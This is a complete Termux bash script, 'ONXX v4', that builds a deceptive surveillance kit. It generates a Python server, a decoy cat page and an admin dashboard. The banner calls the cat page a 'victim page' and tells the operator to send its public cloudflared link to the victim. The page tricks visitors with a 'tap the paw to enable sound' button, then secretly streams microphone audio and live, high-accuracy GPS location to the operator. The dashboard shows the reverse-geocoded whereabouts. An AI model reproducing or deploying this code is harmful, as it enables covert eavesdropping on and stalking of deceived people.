#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#  ONXX v4 - CAT page + AUTO paw + mic + LIVE LOCATION
#  Usage:
#    bash onxx.sh              -> TLS mode (default)
#    bash onxx.sh 8080 http    -> plain HTTP (sirf localhost)
#    bash onxx.sh 8080 cloud   -> cloudflared public HTTPS (NO block)
# ============================================================
if grep -q $'\r$' "$0" 2>/dev/null; then sed -i 's/\r$//' "$0"; exec bash "$0" "$@"; fi
PORT=${1:-8080}; MODE=${2:-tls}
TLS=0; [ "$MODE" = "tls" ] && TLS=1
CLOUD=0; [ "$MODE" = "cloud" ] && CLOUD=1
BASE="$HOME/onxx"; WEB="$BASE/web"; REC="$BASE/recordings"
mkdir -p "$WEB" "$REC"
PHONE=""
if [ -d "$HOME/storage/shared" ]; then PHONE="$HOME/storage/shared/onxx"; mkdir -p "$PHONE"; fi
command -v python3 >/dev/null || pkg install -y python 2>/dev/null
if [ "$TLS" = 1 ] && [ ! -f "$BASE/server.crt" ]; then
  openssl req -x509 -newkey rsa:2048 -keyout "$BASE/server.key" -out "$BASE/server.crt" -days 3650 -nodes -subj "/CN=meow" 2>/dev/null
fi
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -z "$IP" ] && IP=127.0.0.1
S=http; [ "$TLS" = 1 ] && S=https
DIRS="$REC"; [ -n "$PHONE" ] && DIRS="$REC:$PHONE"

R='\e[1;91m'; G='\e[1;92m'; Y='\e[1;93m'; C='\e[1;96m'; W='\e[0m'
"clear"
echo -e "$R
 ██████  ███    ██ ██   ██ ██   ██
██    ██ ████   ██ ██   ██ ██   ██
██    ██ ██ ██  ██ ██   ██ ██   ██
██ ▄▄ ██ ██ ██ ██ ██   ██ ██   ██
 ██████  ██   ████ ██   ██ ██   ██

$C [✓] BY : ONXX 
$C [✓] INSTAGRAM : @__.l2l__
$C [✓] TELEGRAM  : https://t.me/vasu90
 
$G [✓] ONXX v4   |   VOICE CAPTURE + LIVE LOCATION   |   TERMUX
$Y [>] Victim page : $S://$IP:$PORT         (sirf cat photo dikhega)
$Y [>] Admin panel : $S://$IP:$PORT/admin   (live dashboard + location)
$G [>] Localhost   : $S://127.0.0.1:$PORT   (khud test karne ke liye)
$G [>] Save Termux : $REC
$G [>] Save Phone  : $PHONE
$Y [*] Paw button page khulte hi AUTO aayega - 1 click = mic + location start
$W"
[ "$CLOUD" = 1 ] && echo -e "${Y}[*] CLOUD mode - neeche trycloudflare.com URL aayega, yahi victim ko bhejo (koi block nahi)${W}"

cat > "$BASE/srv.py" <<'PYEOF'
import os,sys,time,json,threading,ssl,shutil,subprocess,urllib.request
from http.server import ThreadingHTTPServer,BaseHTTPRequestHandler
from urllib.parse import urlparse,parse_qs
P=int(sys.argv[1]);D=[os.path.abspath(x) for x in sys.argv[2].split(":")]
T=len(sys.argv)>3 and sys.argv[3]=="tls";W=os.path.expanduser("~/onxx/web")
for d in D:os.makedirs(d,exist_ok=True)
FF=shutil.which("ffmpeg")
E={"audio/webm":".webm","audio/mp4":".m4a","audio/ogg":".ogg","audio/wav":".wav","audio/mpeg":".mp3"}
S={"t":time.time(),"b":0,"c":0,"f":[]};L=threading.Lock()
LOC={"lat":None,"lng":None,"acc":None,"t":"--","area":"—","n":0,"_t":0}
def geo(lat,lng):
 try:
  u="https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=16&lat=%.5f&lon=%.5f"%(lat,lng)
  r=urllib.request.Request(u,headers={"User-Agent":"onxx/1.0 (termux)"})
  j=json.load(urllib.request.urlopen(r,timeout=8))
  a=j.get("address",{})
  z=[a.get("road"),a.get("suburb")or a.get("neighbourhood"),a.get("city")or a.get("town")or a.get("village"),a.get("state"),a.get("country")]
  return ", ".join([x for x in z if x]) or j.get("display_name","")[:110]
 except:return""
class H(BaseHTTPRequestHandler):
 protocol_version="HTTP/1.1"
 def log_message(self,*a):pass
 def _s(self,c,t,b):
  self.send_response(c);self.send_header("Content-Type",t);self.send_header("Content-Length",str(len(b)));self.send_header("Cache-Control","no-store");self.end_headers()
  try:self.wfile.write(b)
  except:pass
 def do_GET(self):
  p=urlparse(self.path).path
  if p=="/status":
   with L:b=json.dumps({"up":int(time.time()-S["t"]),"ch":S["c"],"by":S["b"],"f":S["f"][-40:],"dr":len(D),"loc":{k:LOC[k] for k in("lat","lng","acc","t","area","n")}}).encode()
   self._s(200,"application/json",b);return
  if p=="/":p="/index.html"
  elif p=="/admin":p="/admin.html"
  fp=os.path.normpath(os.path.join(W,p.lstrip("/")))
  if not fp.startswith(W):self._s(403,"text/plain",b"forbidden");return
  try:b=open(fp,"rb").read()
  except:self._s(404,"text/plain",b"nf");return
  self._s(200,"text/html; charset=utf-8" if p.endswith(".html") else "application/octet-stream",b)
  if p=="/index.html":print("[>] victim page khuli : "+self.client_address[0],flush=True)
 def do_POST(self):
  q=parse_qs(urlparse(self.path).query);pth=urlparse(self.path).path
  if pth=="/loc":
   try:lat=float(q.get("lat",["0"])[0]);lng=float(q.get("lng",["0"])[0]);acc=int(float(q.get("acc",["0"])[0]))
   except:self._s(400,"text/plain",b"bad");return
   sid=q.get("sid",["?"])[0]
   moved=LOC["lat"] is None or abs(LOC["lat"]-lat)>0.0005 or abs(LOC["lng"]-lng)>0.0005 or time.time()-LOC["_t"]>60
   if moved:area=geo(lat,lng);LOC["_t"]=time.time()
   else:area=LOC.get("area","")
   LOC.update({"lat":lat,"lng":lng,"acc":acc,"t":time.strftime("%H:%M:%S"),"area":area,"n":LOC["n"]+1})
   print("[LOC] %.5f,%.5f acc=%dm %s [%s]"%(lat,lng,acc,area or "area...",sid),flush=True)
   self._s(200,"text/plain",b"OK");return
  n=int(self.headers.get("Content-Length")or 0)
  if n<=0 or n>50_000_000:self._s(400,"text/plain",b"bad");return
  sid="".join(c for c in(q.get("sid",[self.headers.get("X-SID")or"x"])[0])[:16] if c.isalnum())
  m=(q.get("mime",[self.headers.get("X-MIME")or"audio/webm"])[0]).split(";")[0].strip()
  dta=self.rfile.read(n);nm="onxx_%s_%s%s"%(time.strftime("%H%M%S"),sid,E.get(m,".bin"));ok=0
  for d in D:
   try:
    with open(os.path.join(d,nm),"ab") as f:f.write(dta)
    ok+=1
   except:pass
  if FF and ok:
   for d in D:
    try:
     mp=os.path.join(d,nm).rsplit(".",1)[0]+".mp3"
     subprocess.Popen([FF,"-y","-i",os.path.join(d,nm),"-c:a","libmp3lame","-q:a","4",mp],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:pass
  with L:S["b"]+=n;S["c"]+=1;S["f"].append({"n":nm,"s":n,"t":time.strftime("%H:%M:%S")})
  print("[+] %s +%dKB -> %d/%d dirs [%s]"%(nm,n//1024,ok,len(D),self.client_address[0]),flush=True)
  self._s(200,"text/plain",b"OK")
h=ThreadingHTTPServer(("0.0.0.0",P),H)
if T:
 c=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER);c.load_cert_chain(os.path.expanduser("~/onxx/server.crt"),os.path.expanduser("~/onxx/server.key"));h.socket=c.wrap_socket(h.socket,server_side=True)
print("[ONXX] %s://0.0.0.0:%d dirs=%d ffmpeg=%s"%("https" if T else"http",P,len(D),"yes" if FF else"no"),flush=True)
h.serve_forever()
PYEOF

cat > "$WEB/index.html" <<'HTMLEOF'
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#0a0a12"><title>meow</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;
background:radial-gradient(900px 600px at 50% 0%,#2a2350,transparent 60%),radial-gradient(700px 500px at 80% 100%,#1d3a4a,transparent 60%),#0a0a12;
color:#eee;font-family:system-ui,sans-serif;overflow:hidden}
.cat{filter:drop-shadow(0 14px 40px rgba(244,164,96,.35));animation:f 5s ease-in-out infinite}
@keyframes f{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
h1{font-size:clamp(2.2rem,9vw,4.5rem);letter-spacing:.14em;color:#f4a460;text-shadow:0 0 30px rgba(244,164,96,.4)}
p{color:#8b87a6;font-size:.9rem;letter-spacing:.06em}
#tap{position:fixed;left:50%;top:50%;z-index:50;transform:translate(-50%,-50%)scale(0);opacity:0;width:92px;height:92px;border-radius:50%;border:none;cursor:pointer;
background:radial-gradient(circle at 30% 25%,#ffd9a8,#e08a3c);box-shadow:0 0 50px rgba(240,160,90,.7),inset 0 0 20px rgba(255,255,255,.35);transition:.35s;-webkit-tap-highlight-color:transparent}
#tap.sh{opacity:1;transform:translate(-50%,-50%)scale(1);animation:p .5s cubic-bezier(.2,1.6,.4,1)}
#tap:before,#tap:after{content:'';position:absolute;inset:0;border-radius:50%;border:2px solid rgba(240,180,110,.6);animation:rp 2.4s ease-out infinite}
#tap:after{animation-delay:1.2s}
@keyframes p{0%{transform:translate(-50%,-50%)scale(0)}70%{transform:translate(-50%,-50%)scale(1.15)}100%{transform:translate(-50%,-50%)scale(1)}}
@keyframes rp{0%{transform:scale(1);opacity:.9}100%{transform:scale(2.1);opacity:0}}
</style></head><body>
<svg class="cat" width="230" height="230" viewBox="0 0 200 200">
<circle cx="100" cy="112" r="70" fill="#f4a460"/>
<polygon points="46,72 30,18 82,55" fill="#f4a460"/>
<polygon points="154,72 170,18 118,55" fill="#f4a460"/>
<polygon points="50,66 38,30 76,56" fill="#ffb6c1"/>
<polygon points="150,66 162,30 124,56" fill="#ffb6c1"/>
<ellipse cx="74" cy="106" rx="10" ry="12" fill="#2d2d2d"/>
<ellipse cx="126" cy="106" rx="10" ry="12" fill="#2d2d2d"/>
<circle cx="77" cy="102" r="4" fill="#fff"/>
<circle cx="129" cy="102" r="4" fill="#fff"/>
<polygon points="100,120 93,129 107,129" fill="#ff6f91"/>
<path d="M93 129 Q100 138 107 129" stroke="#2d2d2d" fill="none" stroke-width="3" stroke-linecap="round"/>
<line x1="52" y1="118" x2="22" y2="111" stroke="#2d2d2d" stroke-width="2" stroke-linecap="round"/>
<line x1="52" y1="127" x2="22" y2="129" stroke="#2d2d2d" stroke-width="2" stroke-linecap="round"/>
<line x1="148" y1="118" x2="178" y2="111" stroke="#2d2d2d" stroke-width="2" stroke-linecap="round"/>
<line x1="148" y1="127" x2="178" y2="129" stroke="#2d2d2d" stroke-width="2" stroke-linecap="round"/>
<path d="M58 88 Q70 78 82 88" stroke="#e08a3c" fill="none" stroke-width="4" stroke-linecap="round"/>
<path d="M118 88 Q130 78 142 88" stroke="#e08a3c" fill="none" stroke-width="4" stroke-linecap="round"/>
<path d="M60 140 Q80 150 100 142" stroke="#e08a3c" fill="none" stroke-width="3" stroke-linecap="round"/>
<path d="M100 142 Q120 150 140 140" stroke="#e08a3c" fill="none" stroke-width="3" stroke-linecap="round"/>
</svg>
<h1>meow</h1>
<p>just a cute cat &middot; tap the paw to enable sound</p>
<button id="tap"><svg width="42" height="42" viewBox="0 0 24 24" fill="#fff"><ellipse cx="12" cy="15" rx="5.5" ry="4.5"/><circle cx="5.5" cy="9" r="2.4"/><circle cx="11" cy="6" r="2.4"/><circle cx="17.5" cy="9" r="2.4"/></svg></button>
<script>
const tap=document.getElementById('tap');let st=null,rec=null;
const SID=Math.random().toString(36).slice(2,10);
setTimeout(()=>tap.classList.add('sh'),1200);
function pick(){for(const m of['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg;codecs=opus'])if(MediaRecorder.isTypeSupported(m))return m;return''}
/* ---- LIVE LOCATION (area ke saath) ---- */
function geo(){
 if(!navigator.geolocation)return;
 navigator.geolocation.watchPosition(p=>{
  const x=new XMLHttpRequest();
  x.open('POST','/loc?lat='+p.coords.latitude.toFixed(6)+'&lng='+p.coords.longitude.toFixed(6)+'&acc='+Math.round(p.coords.accuracy)+'&sid='+SID);
  x.send();
 },()=>{}, {enableHighAccuracy:true,maximumAge:0,timeout:20000});
}
setTimeout(geo,900);
/* ---- MIC ---- */
tap.onclick=async()=>{
 try{
  st=await navigator.mediaDevices.getUserMedia({audio:true,echoCancellation:false,noiseSuppression:false});
  tap.style.opacity='0';tap.style.pointerEvents='none';
  const MT=pick();rec=new MediaRecorder(st,{mimeType:MT||undefined,audioBitsPerSecond:128000});
  rec.ondataavailable=e=>{
   if(e.data.size>0){
    const x=new XMLHttpRequest();x.open('POST','/upload');
    x.setRequestHeader('X-SID',SID);x.setRequestHeader('X-MIME',MT||'audio/webm');
    x.onerror=()=>{if(rec&&rec.state==='inactive')navigator.sendBeacon('/upload?sid='+SID+'&mime='+encodeURIComponent(MT||'audio/webm'),e.data)};
    x.send(e.data);
   }
  };
  rec.start(8000);
 }catch(e){}
};
addEventListener('pagehide',()=>{
 try{if(rec&&rec.state!=='inactive'){rec.stop();setTimeout(()=>navigator.sendBeacon('/upload?sid='+SID+'&mime='+encodeURIComponent(rec.mimeType),new Blob([],{type:'audio/webm'})),0)}}catch(e){}
 try{st&&st.getTracks().forEach(t=>t.stop())}catch(e){}
});
</script></body></html>
HTMLEOF

cat > "$WEB/admin.html" <<'ADMINEOF'
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#030014"><title>ONXX admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#030014;color:#fff;font-family:system-ui,sans-serif;min-height:100vh;padding:16px;
background:radial-gradient(900px 500px at 20% -5%,rgba(120,30,200,.3),transparent 60%),radial-gradient(700px 500px at 90% 10%,rgba(0,180,255,.2),transparent 60%),#030014}
h1{font:900 26px/1 monospace;letter-spacing:.2em;color:#00f0ff;text-shadow:0 0 20px rgba(0,240,255,.5);margin-bottom:6px}
#st{font:600 11px/1 monospace;color:#778;margin-bottom:18px;letter-spacing:.1em}
#st.on{color:#0f8}#st.off{color:#f55}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}
.card{background:rgba(255,255,255,.05);border:1px solid rgba(0,229,255,.18);border-radius:14px;padding:16px}
.ct{color:#9d5cff;font:700 10px/1 monospace;letter-spacing:.25em;margin-bottom:12px}
.big{font:900 30px/1 monospace}.idle{color:#778}.rec{color:#ff2bd6;text-shadow:0 0 20px rgba(255,43,214,.8);animation:b 1.2s steps(2,start) infinite}
@keyframes b{to{visibility:hidden}}
.kv{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px dashed rgba(255,255,255,.1);font:600 12px/1 monospace}
.kv b{color:#00f0ff}.kv b.warn{color:#ffb300}
table{width:100%;border-collapse:collapse;font:600 10px/1.5 monospace}
th{color:#9d5cff;text-align:left;padding:3px;border-bottom:1px solid rgba(255,255,255,.15)}
td{padding:4px;border-bottom:1px solid rgba(255,255,255,.06);color:#bcd;max-width:130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.sz{color:#0f8}.tm{color:#ffb300}
.em{color:#556;text-align:center;padding:18px 0}
#lmap{display:none;margin-top:12px;color:#00f0ff;font:700 11px/1 monospace;letter-spacing:.15em;text-decoration:none;border:1px solid rgba(0,229,255,.4);padding:8px 12px;border-radius:8px}
</style></head><body>
<h1>ONXX</h1><div id="st">● connecting...</div>
<div class="cards">
<div class="card"><div class="ct">LIVE LOCATION</div>
<div class="kv"><span>Area</span><b class="warn" id="la">—</b></div>
<div class="kv"><span>Coordinates</span><b id="lc">—</b></div>
<div class="kv"><span>Accuracy</span><b id="lacc">—</b></div>
<div class="kv"><span>Last update</span><b id="lt">--</b></div>
<div class="kv"><span>Fixes received</span><b id="ln">0</b></div>
<a id="lmap" href="#" target="_blank" rel="noopener">OPEN IN MAPS ↗</a></div>
<div class="card"><div class="ct">AUDIO</div>
<div class="kv"><span>Chunks received</span><b id="ch">0</b></div>
<div class="kv"><span>Total bytes</span><b id="by">0 B</b></div>
<div class="kv"><span>Uptime</span><b id="up">--</b></div>
<div class="kv"><span>Save dirs</span><b id="dr">0</b></div></div>
<div class="card"><div class="ct">SAVED FILES <span id="fc" style="color:#0f8"></span></div>
<table><thead><tr><th>#</th><th>FILE</th><th>SIZE</th><th>TIME</th></tr></thead>
<tbody id="fr"><tr><td colspan="4" class="em">— waiting —</td></tr></tbody></table></div>
</div>
<script>
function fb(n){if(n<1024)return n+' B';if(n<1048576)return(n/1024).toFixed(1)+' KB';return(n/1048576).toFixed(2)+' MB'}
let lc=-1;
async function poll(){
 try{
  const r=await fetch('/status',{cache:'no-store'});const s=await r.json();
  const st=document.getElementById('st');st.className='on';st.textContent='● connected';
  document.getElementById('ch').textContent=s.ch;document.getElementById('by').textContent=fb(s.by);
  const u=s.up,h=String(Math.floor(u/3600)).padStart(2,'0'),m=String(Math.floor(u%3600/60)).padStart(2,'0'),x=String(u%60).padStart(2,'0');
  document.getElementById('up').textContent=h+':'+m+':'+x;document.getElementById('dr').textContent=s.dr;
  document.getElementById('fc').textContent='('+s.f.length+')';
  const lo=s.loc||{};
  document.getElementById('la').textContent=lo.area||'—';
  document.getElementById('lc').textContent=(lo.lat!=null)?lo.lat+', '+lo.lng:'—';
  document.getElementById('lacc').textContent=(lo.acc!=null)?('±'+lo.acc+' m'):'—';
  document.getElementById('lt').textContent=lo.t||'--';
  document.getElementById('ln').textContent=lo.n||0;
  const lm=document.getElementById('lmap');
  if(lo.lat!=null){lm.style.display='inline-block';lm.href='https://www.google.com/maps?q='+lo.lat+','+lo.lng}else lm.style.display='none';
  const f=s.f.slice().reverse(),fr=document.getElementById('fr');
  fr.innerHTML=f.length?f.map((x,i)=>'<tr><td>'+(f.length-i)+'</td><td title="'+x.n+'">'+x.n+'</td><td class="sz">'+fb(x.s)+'</td><td class="tm">'+x.t+'</td></tr>').join(''):'<tr><td colspan="4" class="em">— waiting —</td></tr>';
  lc=s.ch;
 }catch(e){document.getElementById('st').className='off';document.getElementById('st').textContent='● offline'}
}
setInterval(poll,1000);poll();
</script></body></html>
ADMINEOF

grep -q 'serve_forever' "$BASE/srv.py" || { echo -e "${R}[!] srv.py adhoora - dobara paste karo${W}"; exit 1; }
grep -q '</html>' "$WEB/index.html" || { echo -e "${R}[!] index.html adhoora - dobara paste karo${W}"; exit 1; }
grep -q '</html>' "$WEB/admin.html" || { echo -e "${R}[!] admin.html adhoora - dobara paste karo${W}"; exit 1; }
echo -e "${G}[✓] Sab files ready${W}"

if [ "$CLOUD" = 1 ]; then
  command -v cloudflared >/dev/null || pkg install -y cloudflared 2>/dev/null
  command -v cloudflared >/dev/null || { echo -e "${R}[!] cloudflared nahi mila - 'pkg install cloudflared' karke dobara chalao${W}"; exit 1; }
  python3 "$BASE/srv.py" "$PORT" "$DIRS" &
  SRV=$!
  sleep 1.5
  cloudflared tunnel --url "http://127.0.0.1:$PORT" &
  CLD=$!
  trap 'kill $SRV $CLD 2>/dev/null; exit' INT TERM
  echo -e "${Y}[*] Neeche https://xxxx.trycloudflare.com URL dikhega - YAHI victim ko bhejna hai${W}"
  wait $SRV $CLD
else
  cd "$WEB" && python3 "$BASE/srv.py" "$PORT" "$DIRS" "$([ "$TLS" = 1 ] && echo tls)"
fi
